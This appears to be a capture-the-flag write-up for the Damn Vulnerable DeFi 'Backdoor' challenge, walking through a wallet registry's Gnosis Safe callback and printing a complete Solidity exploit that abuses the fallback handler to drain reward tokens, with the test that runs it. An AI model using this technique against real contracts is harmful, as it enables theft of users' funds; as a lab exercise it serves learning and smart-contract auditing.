@@ -1,0 +1,317 @@
+# Damn Vulnerable DeFi V2 - #11 Backdoor
+
+<p className="text-xs text-right">June 28, 2022 by [patrickd](/about#patrickd)</p>
+
+This is part 8 of the write-up series on Damn Vulnerable DeFi V2. Please consider attempting to solve it on your own first since it's a lot less fun after being spoiled!
+
+---
+
+>[**Challenge #11 - Backdoor**](https://www.damnvulnerabledefi.xyz/challenges/11.html)
+>
+>To incentivize the creation of more secure wallets in their team, someone has deployed a registry of [Gnosis Safe wallets](https://github.com/safe-global/safe-contracts/blob/v1.3.0/contracts/GnosisSafe.sol). When someone in the team deploys and registers a wallet, they will earn 10 DVT tokens.
+>
+>To make sure everything is safe and sound, the registry tightly integrates with the legitimate [Gnosis Safe Proxy Factory](https://github.com/safe-global/safe-contracts/blob/v1.3.0/contracts/proxies/GnosisSafeProxyFactory.sol), and has some additional safety checks.
+>
+>Currently there are four people registered as beneficiaries: Alice, Bob, Charlie and David. The registry has 40 DVT tokens in balance to be distributed among them.
+>
+>Your goal is to take all funds from the registry. In a single transaction.
+
+
+## Code Review
+
+
+From the challenge description alone I can't come up with what the issue might be yet. So let's take it step by step and start by reviewing the scenario setup and the success conditions found in the tests: [_backdoor.challenge.js_](https://github.com/tinchoabbate/damn-vulnerable-defi/blob/v2.1.0/test/backdoor/backdoor.challenge.js).
+
+
+```solidity
+this.masterCopy = await (await ethers.getContractFactory('GnosisSafe', deployer)).deploy();
+this.walletFactory = await (await ethers.getContractFactory('GnosisSafeProxyFactory', deployer)).deploy();
+this.token = await (await ethers.getContractFactory('DamnValuableToken', deployer)).deploy();
+```
+
+Right away, it deploys 3 contracts: _GnosisSafe_, _GnosisSafeProxyFactory_, _DamnValuableToken_. The _GnosisSafe_ contract instance is stored in a variable called _masterCopy_ while _GnosisSafeProxyFactory_'s instance is put into _walletFactory_. If you are familiar with the [proxy-factory pattern](https://blockchain-academy.hs-mittweida.de/courses/solidity-coding-beginners-to-intermediate/lessons/solidity-11-coding-patterns/topic/factory-clone/) this should make sense: _GnosisSafe_ safe is the Logic Contract that contains the actual business logic of Gnosis Wallets. The _GnosisSafeProxyFactory_ is a contract that can produce cheap clones of _GnosisSafe_. Cheap because there's no need to redeploy the entire business logic, just deploying a Proxy contract that delegate-calls to _GnosisSafe_ is sufficient since it can execute the master copy's code within the context of its own state.
+
+```solidity
+this.walletRegistry = await (await ethers.getContractFactory('WalletRegistry', deployer)).deploy(
+    this.masterCopy.address,
+    this.walletFactory.address,
+    this.token.address,
+    users
+);
+```
+
+Next up, it deploys the _WalletRegistry_ contract, the main target of this challenge, and passes to it the addresses of the previously deployed contracts, plus the four mentioned beneficiaries. After these users are registered on the contract as such, the registry is given the 40 DVT of rewards that belong to each of them.
+
+That's it for the setup, it's simpler than expected and, while we might need some basic understanding of Gnosis, we'll probably just have to take a very good look at the registry contract to find the issue.
+
+```solidity
+let wallet = await this.walletRegistry.wallets(users[i]);
+expect(wallet).to.not.eq(ethers.constants.AddressZero, "User did not register a wallet");
+expect(await this.walletRegistry.beneficiaries(users[i])).to.be.false;
+```
+
+As expected the success conditions require us to move all 40 DamnValuableTokens into the _attacker_ account, but what's more interesting is that they require all of the 4 users to no longer be registered as beneficiaries but have a registered Wallet - that seems like a pretty big hint! During the setup no Wallets were created for each user to be able to claim these rewards. So most likely we'll be able to claim them for ourselves with our own wallets despite not being an eligible user.
+
+---
+
+Let's look at the only contract that is specific to this challenge first, [_WalletRegistry.sol_](https://github.com/tinchoabbate/damn-vulnerable-defi/blob/v2.1.0/contracts/backdoor/WalletRegistry.sol), and see if it's possible to find the issue without knowing much about Gnosis itself.
+
+```
+ * @dev The registry has embedded verifications to ensure only legitimate Gnosis Safe wallets are stored.
+```
+
+I guess that is called foreshadowing?
+
+Most of the code can be skipped, things start to get interesting here:
+
+```solidity
+/**
+ @notice Function executed when user creates a Gnosis Safe wallet via
+ GnosisSafeProxyFactory::createProxyWithCallback setting the registry's address as the callback.
+*/
+function proxyCreated(
+    GnosisSafeProxy proxy,
+    address singleton,
+    bytes calldata initializer,
+    uint256
+) external override {
+```
+
+The first thing that comes to mind when reading "callback function" is: Does it make sure that it can really only be invoked by the expected caller, in this case, the _GnosisSafeProxyFactory_?
+
+```solidity
+require(msg.sender == walletFactory, "Caller must be factory");
+require(singleton == masterCopy, "Fake mastercopy used");
+```
+
+Yes, it does, guess that would've been too easy. And it's also checking that the used master copy (singleton) was the real _GnosisSafe_ logic contract - so we can't make use of a manipulated wallet to return fake data.
+
+```solidity
+// Ensure initial calldata was a call to `GnosisSafe::setup`
+require(bytes4(initializer[:4]) == GnosisSafe.setup.selector, "Wrong initialization");
+```
+
+I assume this is supposed to ensure that, after the Proxy was deployed, the wallet was initialized using the _setup_ function and no other. Not sure whether that'll end up being relevant yet.
+
+Anyway, so where does it check whether the owner of the wallet, the person who initiated the wallet creation triggering this callback in the first place, is actually a beneficiary?
+
+```solidity
+require(GnosisSafe(walletAddress).getThreshold() == MAX_THRESHOLD, "Invalid threshold");
+require(GnosisSafe(walletAddress).getOwners().length == MAX_OWNERS, "Invalid number of owners");
+address walletOwner = GnosisSafe(walletAddress).getOwners()[0];
+require(beneficiaries[walletOwner], "Owner is not registered as beneficiary");
+```
+
+There it is, it fetches the first owner of the wallet and checks whether they are a registered beneficiary. Note that *MAX_THRESHOLD* and *MAX_OWNERS* are both 1, so we can't simply bypass it by being a secondary owner either.
+
+```solidity
+_removeBeneficiary(walletOwner);
+wallets[walletOwner] = walletAddress;
+token.transfer(walletAddress, TOKEN_PAYMENT);
+```
+
+The functions wraps up by removing the beneficiary, registering their wallet address, and transferring the reward tokens to it.
+
+It seems that there must be some way to have control over a Gnosis wallet as a creator without currently being one of its owners?
+
+---
+
+Let's take a look at [_GnosisSafeProxyFactory_](https://github.com/safe-global/safe-contracts/blob/v1.3.0/contracts/proxies/GnosisSafeProxyFactory.sol) now since that is the only contract being able to call into the registry's callback function.
+
+First, I checked whether there's any other function than _createProxyWithCallback_ that would allow making calls to the registry, but I didn't see any.
+
+```solidity
+function createProxyWithCallback(
+    address _singleton,
+    bytes memory initializer,
+    uint256 saltNonce,
+    IProxyCreationCallback callback
+) public returns (GnosisSafeProxy proxy) {
+    uint256 saltNonceWithCallback = uint256(keccak256(abi.encodePacked(saltNonce, callback)));
+    proxy = createProxyWithNonce(_singleton, initializer, saltNonceWithCallback);
+    if (address(callback) != address(0)) callback.proxyCreated(proxy, _singleton, initializer, saltNonce);
+}
+```
+
+Nothing unexpected. The proxy contract is deployed and the callback is called afterwards.
+
+Maybe there's something interesting happening with the _initializer_?
+
+```solidity
+function createProxyWithNonce(
+    address _singleton,
+    bytes memory initializer,
+    uint256 saltNonce
+) public returns (GnosisSafeProxy proxy) {
+    proxy = deployProxyWithNonce(_singleton, initializer, saltNonce);
+    if (initializer.length > 0)
+        assembly {
+            if eq(call(gas(), proxy, 0, add(initializer, 0x20), mload(initializer), 0, 0), 0) {
+                revert(0, 0)
+            }
+        }
+    emit ProxyCreation(proxy, _singleton);
+}
+```
+
+Now this assembly/yul code might look a little bit intimidating but it's rather simple: It's [_CALL_](https://www.evm.codes/#f1)ing the just created proxy contract with the calldata passed in the _initializer_ variable.
+
+Note that _initializer_ is a _bytes_ array stored in _memory_, so when the variable is accessed within assembly its actual value is a number, a memory pointer, the address of where the _bytes_ array is stored. Another thing to understand is that the first 32 bytes (or `0x20` in hexadecimal) of a _bytes_ array in Solidity, still isn't the actual value that was passed as initializer, it's basically an unsigned integer of the _initializer_'s length.
+
+Therefore `mload(initializer)` is loading that length. And `add(initializer, 0x20)` calculates the address where the actual _initializer_ value starts in memory. That means that a `call()` is being made to the _proxy_, passing all still available `gas()`, specifying the full _initializer_ variable as the calldata and dismissing any return data. Finally, `eq(call(...), 0)` ensures that it `revert()`s in case the call didn't succeed.
+
+This all seems pretty normal. With that, I assume we can pass something to `GnosisSafe::setup()` via the _initializer_ that allows us to do some kind of unexpected shenanigans.
+
+---
+
+The [_GnosisSafe's setup function_](https://github.com/safe-global/safe-contracts/blob/v1.3.0/contracts/GnosisSafe.sol#L75-L97) certainly has some parameters that sound quite interesting:
+
+```solidity
+/// @dev Setup function sets initial storage of contract.
+/// @param _owners List of Safe owners.
+/// @param _threshold Number of required confirmations for a Safe transaction.
+/// @param to Contract address for optional delegate call.
+/// @param data Data payload for optional delegate call.
+/// @param fallbackHandler Handler for fallback calls to this contract
+/// @param paymentToken Token that should be used for the payment (0 is ETH)
+/// @param payment Value that should be paid
+/// @param paymentReceiver Adddress that should receive the payment (or 0 if tx.origin)
+function setup(
+    address[] calldata _owners,
+    uint256 _threshold,
+    address to,
+    bytes calldata data,
+    address fallbackHandler,
+    address paymentToken,
+    uint256 payment,
+    address payable paymentReceiver
+) external {
+```
+
+An "optional delegate call"? A "handler for fallback calls to this contract"? Sounds promising.
+
+```solidity
+if (fallbackHandler != address(0)) internalSetFallbackHandler(fallbackHandler);
+setupModules(to, data);
+```
+
+It seems the "optional delegate call" using the *to* and _data_ parameters is executed immediately. Since the registry callback is called after _setup_ has finished this doesn't help us much. At this point, we wouldn't have received those DVT Tokens that we need yet and we can't add ourselves as owner either since then the checks in the callback would then fail. [EDIT: Later on Discord [silent_mastodon#1304](https://discord.com/channels/814328279468474419/887889071446310933/991763920916336710) pointed out that this can actually be exploited - by using token approvals!]
+
+Now it would be really good if the fallback-handler is delegate-called into as well. In that case, we could set our own exploitation contract as fallback handler and, once the callback sent the tokens to the wallet, we could trigger the fallback and execute arbitrary code within the wallet's context - such as moving all tokens to the attacker's EOA.
+
+The fallback handling logic can be found in [_/base/FallbackManager.sol_](https://github.com/safe-global/safe-contracts/blob/v1.3.0/contracts/base/FallbackManager.sol):
+
+```solidity
+fallback() external {
+    ...
+    assembly {
+        ...
+        calldatacopy(0, 0, calldatasize())
+        // The msg.sender address is shifted to the left by 12 bytes to remove the padding
+        // Then the address without padding is stored right after the calldata
+        mstore(calldatasize(), shl(96, caller()))
+        // Add 20 bytes for the address appended add the end
+        let success := call(gas(), handler, 0, 0, add(calldatasize(), 20), 0, 0)
+        returndatacopy(0, 0, returndatasize())
+        if iszero(success) {
+            revert(0, returndatasize())
+        }
+        return(0, returndatasize())
+    }
+}
+```
+
+It doesn't take much assembly knowledge to know that this is a `call()` and not a `delegatecall()` as I was hoping for.
+
+But wait! This still allows us to make arbitrary calls to a single address that we can freely choose. The _GnosisSafe_ contract does not have a _transfer_ function. So if we'd set the token address as fallback-handler and call `transfer()` on the wallet, the wallet should call _transfer_ on the token. Since the token contract is being called by the wallet, the `msg.sender` will be the wallet's address and therefore we can freely transfer tokens that belong to the wallet.
+
+
+## Exploit
+
+The challenge description told us "to take all funds from the registry. In a single transaction." – therefore we'll need a smartcontract executing the entire exploitation:
+
+```solidity showLineNumbers filename="BackdoorExploit.sol" copy 
+contract BackdoorExploit {
+    constructor(
+        address registryAddress,
+        address masterCopyAddress,
+        IGnosisSafeProxyFactory walletFactory,
+        IERC20 token,
+        address[] memory victims
+    ) {
+        // Create a wallet for each beneficiary.
+        for (uint256 i = 0; i < victims.length; i++) {
+            address beneficiary = victims[i];
+            address[] memory owners = new address[](1);
+            owners[0] = beneficiary;
+
+            address wallet = walletFactory.createProxyWithCallback(
+                masterCopyAddress,              // Singleton, the Gnosis master copy
+                abi.encodeWithSelector(         // Build initializer bytes array
+                    IGnosisSafe.setup.selector, // Function signature to call, must be setup()
+                    owners,                     // Must be exactly one of the registered beneficiaries
+                    1,                          // Threshold, must be 1
+                    address(0x0),               // Optional delegate call address, don't care
+                    0x0,                        // Optional delegate call data, don't care
+                    address(token),             // Specify the Token as fallback handler
+                    address(0x0),               // Payment token, don't care
+                    0,                          // Payment, don't care
+                    address(0x0)                // Payment receiver, don't care
+                ),
+                0, // We don't care about the salt or what address the Wallet gets from it
+                registryAddress // Registry has the callback we want to exploit
+            );
+
+            // Wallet should now have received the DVT Tokens from the callback.
+
+            // We'll act as if the Wallet itself is a token,
+            // this transfer will be forwarded to the token contract.
+            IERC20(wallet).transfer(msg.sender, 10 ether);
+        }
+    }
+}
+```
+
+Then we adjust the [backdoor.challenge.js](https://github.com/tinchoabbate/damn-vulnerable-defi/blob/v2.1.0/test/backdoor/backdoor.challenge.js) to make a single transaction, the deployment of the exploit contract:
+
+
+```javascript
+it('Exploit', async function () {
+    const ExploitFactory = await ethers.getContractFactory('BackdoorExploit', attacker);
+    await ExploitFactory.deploy(
+        this.walletRegistry.address,
+        this.masterCopy.address,
+        this.walletFactory.address,
+        this.token.address,
+        users
+    );
+});
+```
+
+And finally...
+
+```bash
+patrickd@damnvulndefi:~/damn-vulnerable-defi$ yarn run backdoor
+yarn run v1.22.17
+$ yarn hardhat test test/backdoor/backdoor.challenge.js
+$ /home/patrickd/damn-vulnerable-defi/node_modules/.bin/hardhat test test/backdoor/backdoor.challenge.js
+Compiling 1 file with 0.8.7
+Compilation finished successfully
+
+
+  [Challenge] Backdoor
+    ✓ Exploit (1581ms)
+
+
+  1 passing (2s)
+
+Done in 3.85s.
+```
+
+We got it!
+
+---
+
+Did this take me way too long to solve? Well, I'm certain that the solution would've been a lot more obvious if I'd had any prior knowledge of the Gnosis contracts. But I just now obtained this knowledge through poking around, the best way to learn new things (in my opinion)!
+
+I think the challenge was a lot of fun. It felt very "real" and, although I can't remember one from the top of my head, I imagine something like this must have happened before.
